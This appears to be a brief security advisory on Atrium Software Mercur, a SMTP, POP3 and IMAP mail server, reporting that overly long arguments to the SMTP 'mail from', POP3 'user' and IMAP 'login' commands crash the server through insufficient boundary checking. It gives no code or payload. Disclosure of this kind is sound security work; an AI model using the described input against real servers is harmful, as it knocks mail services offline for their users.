Atrium Software Mercur is a SMTP, POP3, and IMAP mail server. Insufficient boundary checking exists in the code that handles within the SMTP "mail from" command, the POP3 "user" command and the IMAP "login" command. The application will crash if an overly long string is used as an argument to any of these commands.
